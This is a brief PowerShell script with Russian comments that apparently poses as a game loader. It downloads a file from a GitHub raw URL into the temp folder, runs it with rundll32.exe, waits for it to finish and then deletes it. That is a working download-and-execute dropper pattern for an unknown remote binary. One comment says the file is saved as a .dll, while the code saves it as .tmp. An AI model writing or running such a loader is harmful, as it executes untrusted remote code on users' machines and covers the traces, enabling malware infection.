$ErrorActionPreference = "Stop"

$GameUrl = "https://github.com/tema132b-arch/testz/raw/main/bee2059e-df7f-4c09-a69b-821ccd8573c7.tmp"
# Важно: сохраняем файл с расширением .dll, чтобы rundll32 корректно его воспринял
$TempFile = Join-Path ([IO.Path]::GetTempPath()) "bee2059e-df7f-4c09-a69b-821ccd8573c7.tmp"

Invoke-WebRequest -Uri $GameUrl -OutFile $TempFile -UseBasicParsing

# Формируем аргументы: "путь_к_файлу",Run
# Кавычки вокруг пути обязательны, если в пути есть пробелы
$Arguments = "`"$TempFile`",Run"

# Запускаем rundll32 и ждём завершения
$proc = Start-Process -FilePath "rundll32.exe" -ArgumentList $Arguments -PassThru
$proc.WaitForExit()

Remove-Item $TempFile -Force -ErrorAction SilentlyContinue
